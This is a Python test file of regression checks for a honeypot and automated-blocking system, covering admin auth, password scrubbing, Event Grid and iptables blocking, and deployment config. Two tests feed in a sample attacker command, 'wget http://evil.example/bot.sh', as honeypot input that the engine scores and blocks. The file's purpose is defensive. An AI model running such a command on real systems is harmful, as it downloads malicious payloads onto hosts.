"""Regression tests for the Azure-readiness hardening pass."""

from __future__ import annotations

import asyncio
import importlib.util
import json
import sys
import types
from pathlib import Path

import pytest
from fastapi.testclient import TestClient
from pydantic import SecretStr

import cloudsentinel._secrets as secrets
import cloudsentinel.admin_api as admin_api
from cloudsentinel.admin_api import create_admin_app
from cloudsentinel.config import RedisSettings, load_settings
from cloudsentinel.hassh import HASSHDNA
from cloudsentinel.pipeline import EventEnvelope, EventPipeline
from cloudsentinel.server import ConnectionLimiter
from cloudsentinel.stream import LiveStream

REPO_ROOT = Path(__file__).resolve().parents[3]


def _settings():
    settings = load_settings(
        "src/cloudsentinel/configs/usas-production.yaml",
        "src/cloudsentinel/.env",
    )
    settings.admin.enabled = True
    settings.clickhouse.enabled = False
    settings.stream.enabled = False
    return settings


def _admin_client(settings) -> TestClient:
    pipeline = EventPipeline(settings.redis)
    return TestClient(create_admin_app(settings, pipeline))


def test_admin_api_refuses_requests_when_auth_is_not_configured(monkeypatch) -> None:
    monkeypatch.delenv("CLOUDSENTINEL_AUTH_ENABLED", raising=False)
    monkeypatch.delenv("CLOUDSENTINEL_AUTH_SECRET", raising=False)
    settings = _settings()
    settings.admin.token = SecretStr("")
    client = _admin_client(settings)
    assert client.get("/stats").status_code == 503


def test_admin_login_rejects_empty_admin_password(monkeypatch) -> None:
    monkeypatch.setenv("CLOUDSENTINEL_AUTH_ENABLED", "true")
    monkeypatch.setenv("CLOUDSENTINEL_AUTH_SECRET", "unit-secret")
    monkeypatch.setenv("CLOUDSENTINEL_ADMIN_USER", "admin")
    monkeypatch.delenv("CLOUDSENTINEL_ADMIN_PASS", raising=False)
    settings = _settings()
    settings.admin.token = SecretStr("")
    client = _admin_client(settings)
    response = client.post("/auth/login", json={"username": "admin", "password": ""})
    assert response.status_code == 503


class _FakeSio:
    def __init__(self) -> None:
        self.emitted: list[dict] = []

    async def emit(self, _event: str, data: dict, to: str | None = None) -> None:
        self.emitted.append(data)


@pytest.mark.asyncio
async def test_stream_removes_passwords_from_public_events() -> None:
    stream = LiveStream()
    stream._started = True
    stream._sio = _FakeSio()
    stream.emit(
        {
            "eventid": "cloudsentinel.login.success",
            "username": "root",
            "password": "hunter2",
        }
    )
    await asyncio.sleep(0)
    assert "password" not in stream._buffer[-1]
    await stream.emit_coro(
        {
            "eventid": "cloudsentinel.login.success",
            "username": "root",
            "password": "hunter2",
        }
    )
    assert "password" not in stream._buffer[-1]


class _FailingRedis:
    async def xadd(self, *_args, **_kwargs):
        raise RuntimeError("redis down")


@pytest.mark.asyncio
async def test_pipeline_does_not_keep_a_second_retry_copy(tmp_path, monkeypatch) -> None:
    monkeypatch.chdir(tmp_path)
    pipeline = EventPipeline(RedisSettings())
    pipeline._redis = _FailingRedis()
    pipeline._connected = True
    envelope = EventEnvelope("e", "session", "8.8.8.8", 22, 1.0, {"eventid": "e"})
    await pipeline.emit(envelope)
    assert len(pipeline._pending) == 0
    events = await pipeline._wal.read_and_clear()
    assert len(events) == 1


def test_load_settings_runs_cross_field_validation(tmp_path) -> None:
    config_path = tmp_path / "config.yaml"
    env_path = tmp_path / "env"
    config_path.write_text(
        "soar:\n  active_profile: production\n  firewall_dry_run: true\n",
        encoding="utf-8",
    )
    env_path.write_text("", encoding="utf-8")
    with pytest.raises(ValueError, match="Production profile"):
        load_settings(config_path, env_path)


def test_eventgrid_settings_from_env(monkeypatch, tmp_path) -> None:
    monkeypatch.setenv("EVENTGRID_ENABLED", "true")
    monkeypatch.setenv("EVENTGRID_TOPIC_ENDPOINT", "https://topic.example.com/api/events")
    monkeypatch.setenv("EVENTGRID_TOPIC_KEY", "unit-key")
    env_path = tmp_path / "env"
    env_path.write_text("", encoding="utf-8")
    settings = load_settings(
        "src/cloudsentinel/configs/usas-production.yaml",
        env_path,
    )
    assert settings.soar.eventgrid_enabled is True
    assert settings.soar.eventgrid_topic_endpoint == "https://topic.example.com/api/events"
    assert settings.soar.eventgrid_topic_key.get_secret_value() == "unit-key"


@pytest.mark.asyncio
async def test_soar_publishes_block_to_eventgrid(monkeypatch) -> None:
    calls: list[dict] = []

    async def fake_publish(**kwargs):
        calls.append(kwargs)
        return True, ""

    monkeypatch.setattr("cloudsentinel.soar.publish_block", fake_publish)
    from cloudsentinel.soar import SOAREngine

    engine = SOAREngine(
        risk_threshold=30,
        firewall_enabled=True,
        firewall_dry_run=False,
        allowlist=["127.0.0.1"],
        eventgrid_enabled=True,
        eventgrid_endpoint="https://topic.example.com/api/events",
        eventgrid_key="unit-key",
    )
    event = {
        "eventid": "cloudsentinel.command.input",
        "src_ip": "8.8.8.8",
        "session": "s1",
        "input": "wget http://evil.example/bot.sh",
        "cloudsentinel_risk_score": 100,
    }
    result = await engine.process_event("s1", event)
    assert result["cloudsentinel_soar_action"] == "eventgrid_published"
    assert calls
    assert calls[0]["ip"] == "8.8.8.8"
    assert calls[0]["endpoint"] == "https://topic.example.com/api/events"
    assert calls[0]["key"] == "unit-key"


class _FakeRedis:
    def __init__(self) -> None:
        self.store: dict[str, object] = {}
        self.published: list[tuple[str, str]] = []
        self.fail_publish = False

    async def get(self, key: str):
        return self.store.get(key)

    async def set(self, key: str, value: object, ex: int | None = None) -> bool:
        self.store[key] = value
        return True

    async def exists(self, key: str) -> int:
        return 1 if key in self.store else 0

    async def smembers(self, _key: str) -> set[str]:
        return set()

    async def sadd(self, _key: str, *values: str) -> int:
        return len(values)

    async def expire(self, _key: str, _ttl: int) -> bool:
        return True

    async def delete(self, *_keys: str) -> int:
        return 1

    async def publish(self, channel: str, payload: str) -> int:
        if self.fail_publish:
            raise RuntimeError("redis publish failed")
        self.published.append((channel, payload))
        return 1

    async def aclose(self) -> None:
        return None


@pytest.mark.asyncio
async def test_soar_eventgrid_also_notifies_host_agent(monkeypatch) -> None:
    async def fake_publish(**kwargs):
        return True, ""

    monkeypatch.setattr("cloudsentinel.soar.publish_block", fake_publish)
    from cloudsentinel.soar import SOAREngine

    engine = SOAREngine(
        risk_threshold=30,
        firewall_enabled=True,
        firewall_dry_run=False,
        allowlist=["127.0.0.1"],
        eventgrid_enabled=True,
        eventgrid_endpoint="https://topic.example.com/api/events",
        eventgrid_key="unit-key",
    )
    fake_redis = _FakeRedis()
    engine._redis = fake_redis
    event = {
        "eventid": "cloudsentinel.command.input",
        "src_ip": "8.8.8.8",
        "session": "s1",
        "input": "wget http://evil.example/bot.sh",
        "cloudsentinel_risk_score": 100,
    }
    result = await engine.process_event("s1", event)
    assert result["cloudsentinel_soar_action"] == "eventgrid_published"
    assert fake_redis.published
    channel, payload = fake_redis.published[0]
    assert channel == "cloudsentinel:soar:blocks"
    assert json.loads(payload)["ip"] == "8.8.8.8"


def test_manual_block_uses_eventgrid(monkeypatch) -> None:
    calls: list[dict] = []

    async def fake_publish(**kwargs):
        calls.append(kwargs)
        return True, ""

    monkeypatch.setattr("cloudsentinel.admin_api.publish_block", fake_publish)
    settings = _settings()
    settings.admin.token = SecretStr("unit-token")
    fake_redis = _FakeRedis()
    soar = types.SimpleNamespace(
        eventgrid_enabled=True,
        eventgrid_endpoint="https://topic.example.com/api/events",
        eventgrid_key="unit-key",
        _redis=fake_redis,
    )
    client = TestClient(create_admin_app(settings, EventPipeline(settings.redis), soar))
    response = client.post(
        "/admin/block-ip",
        headers={"Authorization": "Bearer unit-token"},
        json={"ip": "8.8.8.8", "ttl": 60, "reason": "unit"},
    )
    assert response.status_code == 200
    assert response.json()["action"] == "eventgrid_published"
    assert calls
    assert calls[0]["ip"] == "8.8.8.8"
    assert calls[0]["ttl"] == 60
    assert fake_redis.published


def test_bicep_mounts_sensor_disk_and_private_vault() -> None:
    main = Path("infra/main.bicep").read_text(encoding="utf-8")
    assert "sensor-cloud-init.sh" in main
    assert "privatelink.vaultcore.azure.net" in main
    assert "publicNetworkAccess: 'Disabled'" in main
    assert Path("infra/sensor-cloud-init.sh").is_file()


def test_deploy_sets_redis_and_clickhouse_auth() -> None:
    deploy = Path("src/cloudsentinel/deploy.sh").read_text(encoding="utf-8")
    assert "requirepass" in deploy
    assert "cloudsentinel-password.xml" in deploy
    backup = Path("deploy/backup.sh").read_text(encoding="utf-8")
    assert "REDISCLI_AUTH" in backup
    bicep = Path("infra/main.bicep").read_text(encoding="utf-8")
    assert "clickHousePassword" in bicep
    cloud_init = Path("infra/clickhouse-cloud-init.sh").read_text(encoding="utf-8")
    assert "__CLICKHOUSE_PASSWORD__" in cloud_init


def test_bicep_has_function_monitoring() -> None:
    bicep = Path("infra/main.bicep").read_text(encoding="utf-8")
    assert "Microsoft.Insights/components" in bicep
    assert "Microsoft.OperationalInsights/workspaces" in bicep
    assert "APPLICATIONINSIGHTS_CONNECTION_STRING" in bicep


def test_manual_block_survives_host_agent_publish_failure(monkeypatch) -> None:
    async def fake_publish(**kwargs):
        return True, ""

    monkeypatch.setattr("cloudsentinel.admin_api.publish_block", fake_publish)
    settings = _settings()
    settings.admin.token = SecretStr("unit-token")
    fake_redis = _FakeRedis()
    fake_redis.fail_publish = True
    soar = types.SimpleNamespace(
        eventgrid_enabled=True,
        eventgrid_endpoint="https://topic.example.com/api/events",
        eventgrid_key="unit-key",
        _redis=fake_redis,
    )
    client = TestClient(create_admin_app(settings, EventPipeline(settings.redis), soar))
    response = client.post(
        "/admin/block-ip",
        headers={"Authorization": "Bearer unit-token"},
        json={"ip": "8.8.8.8", "ttl": 60, "reason": "unit"},
    )
    assert response.status_code == 200
    assert response.json()["action"] == "eventgrid_published"


def test_docker_nats_requires_auth() -> None:
    source = Path("src/cloudsentinel/docker-compose.yml").read_text(encoding="utf-8")
    assert "--user" in source
    assert "--pass" in source
    assert "NATS_URL: nats://${NATS_USER" in source


def test_soar_memory_is_bounded() -> None:
    from cloudsentinel.soar import SOAREngine

    engine = SOAREngine(risk_threshold=30, firewall_enabled=False)
    engine._MAX_MEM_ENTRIES = 3
    for index in range(5):
        engine._update_ip_profile(f"8.8.8.{index}", f"s{index}", 10, {"T1"}, float(index))
    engine._mem_session_scores.update({f"s{index}": 1 for index in range(5)})
    engine._mem_last_activity.update({f"s{index}": float(index) for index in range(5)})
    engine._prune_memory()
    assert set(engine._mem_ip_first_seen) == {"8.8.8.2", "8.8.8.3", "8.8.8.4"}
    assert set(engine._mem_session_scores) == {"s2", "s3", "s4"}


def test_hassh_seen_map_is_bounded() -> None:
    dna = HASSHDNA(max_seen=3)
    for index in range(5):
        dna.record_sighting(f"hash{index}", "8.8.8.8")
    assert len(dna._seen) == 3
    assert "hash0" not in dna._seen
    assert "hash4" in dna._seen


def test_connection_limiter_ip_map_is_bounded() -> None:
    limiter = ConnectionLimiter(
        max_per_ip=10,
        max_total=100,
        window=60,
        max_entries=3,
    )
    for index in range(5):
        assert limiter.acquire_nowait(f"8.8.8.{index}") is True
    assert len(limiter._ips) == 3
    assert "8.8.8.4" in limiter._ips


def test_validate_settings_requires_eventgrid_credentials() -> None:
    from cloudsentinel.config import validate_settings

    settings = _settings()
    settings.soar.eventgrid_enabled = True
    settings.soar.eventgrid_topic_endpoint = ""
    settings.soar.eventgrid_topic_key = SecretStr("")
    with pytest.raises(ValueError, match="Event Grid"):
        validate_settings(settings)


def test_vault_reads_kv_v2_path(monkeypatch) -> None:
    monkeypatch.setenv("VAULT_ADDR", "http://vault")
    monkeypatch.setenv("VAULT_TOKEN", "token")
    paths: list[str] = []

    class FakeKV:
        async def read_secret_version(self, **kwargs):
            paths.append(kwargs["path"])
            return {"data": {"data": {"value": "vault-value"}}}

    class FakeClient:
        def __init__(self, **_kwargs) -> None:
            self.secrets = types.SimpleNamespace(kv=types.SimpleNamespace(v2=FakeKV()))

        async def is_authenticated(self) -> bool:
            return True

    fake_hvac = types.ModuleType("hvac")
    fake_hvac.AsyncClient = FakeClient
    monkeypatch.setitem(sys.modules, "hvac", fake_hvac)
    provider = secrets.VaultProvider()
    assert asyncio.run(provider.get("UNIT_KEY", "fallback")) == "vault-value"
    assert paths[-1] == "cloudsentinel/unit_key"


def test_deploy_installs_host_agent() -> None:
    source = Path("src/cloudsentinel/deploy.sh").read_text(encoding="utf-8")
    assert "cloudsentinel-host-agent.service" in source
    assert "host_agent/iptables_worker.py" in source


def test_compose_requires_admin_token() -> None:
    source = Path("src/cloudsentinel/docker-compose.yml").read_text(encoding="utf-8")
    assert "ADMIN_TOKEN: ${ADMIN_TOKEN:?" in source


def test_runtime_requirements_exclude_test_tools() -> None:
    runtime = Path("src/cloudsentinel/requirements.txt").read_text(encoding="utf-8")
    dev = Path("src/cloudsentinel/requirements-dev.txt")
    assert dev.is_file()
    assert "pytest>=" not in runtime
    assert "locust>=" not in runtime
    assert "hypothesis>=" not in runtime


def test_mttb_view_counts_production_block_action() -> None:
    source = Path("src/cloudsentinel/schema.sql").read_text(encoding="utf-8")
    assert "event_published" in source


def test_dashboard_routes_have_no_hardcoded_offline_host() -> None:
    routes = Path("dashboard/src/app/api/cloudsentinel").glob("*/route.ts")
    for route in routes:
        assert "188.166.184.42" not in route.read_text(encoding="utf-8"), route
    live_events = Path("dashboard/src/lib/liveEvents.ts").read_text(encoding="utf-8")
    assert "188.166.184.42" not in live_events


def test_backup_script_has_native_and_offsite_paths() -> None:
    source = Path("deploy/backup.sh").read_text(encoding="utf-8")
    assert "redis-cli" in source
    assert "az storage blob upload" in source
    assert "BACKUP_MODE" in source


def test_verify_route_limits_otp_attempts() -> None:
    source = Path("dashboard/src/app/api/auth/verify/route.ts").read_text(encoding="utf-8")
    assert "cloudsentinel_otp_failures" in source


def test_turnstile_test_secret_is_not_used_in_production() -> None:
    source = Path("dashboard/src/app/api/auth/login/route.ts").read_text(encoding="utf-8")
    assert 'process.env.NODE_ENV !== "production"' in source


def _load_worker_module():
    path = REPO_ROOT / "src" / "host_agent" / "iptables_worker.py"
    spec = importlib.util.spec_from_file_location("iptables_worker_test", path)
    module = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    spec.loader.exec_module(module)
    return module


@pytest.mark.asyncio
async def test_host_agent_applies_block_without_ttl() -> None:
    worker_module = _load_worker_module()
    worker = worker_module.IPTablesWorker("redis://unit")
    calls: list[list[str]] = []

    async def fake_run(args: list[str]) -> tuple[int, str, str]:
        calls.append(args)
        return (1, "", "") if args[0] == "-C" else (0, "", "")

    worker._run_firewall = fake_run
    await worker.block_ip("203.0.113.10", 0)
    assert calls == [
        ["-C", "INPUT", "-s", "203.0.113.10", "-j", "DROP"],
        ["-A", "INPUT", "-s", "203.0.113.10", "-j", "DROP"],
    ]


def test_manual_unblock_helper_is_scheduled(monkeypatch) -> None:
    calls: list[list[str]] = []

    async def fake_run(args: list[str]) -> tuple[int, str, str]:
        calls.append(args)
        return (0, "", "")

    monkeypatch.setattr(admin_api, "_run_command", fake_run)
    helper = getattr(admin_api, "_schedule_manual_unblock")
    asyncio.run(helper("203.0.113.10", "unit", 0, "/sbin/iptables"))
    assert calls[-1][:2] == ["/sbin/iptables", "-D"]
